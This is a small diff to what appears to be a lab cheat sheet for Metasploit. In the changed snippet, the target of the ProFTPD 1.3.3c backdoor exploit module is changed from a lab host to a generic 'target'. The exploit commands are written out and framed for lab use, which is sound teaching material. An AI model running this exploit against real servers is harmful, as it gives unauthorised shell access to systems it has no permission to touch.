@@ -52,7 +52,7 @@ Shows discovered hosts and services.
 
 ```bash
 use exploit/unix/ftp/proftpd_133c_backdoor
-set RHOSTS demo.ine.local
+set RHOSTS target
 exploit
 ```
 
@@ -88,3 +88,4 @@ Used to manage active sessions.
 * Use only in lab environments
 
 > Tested during lab environments
+
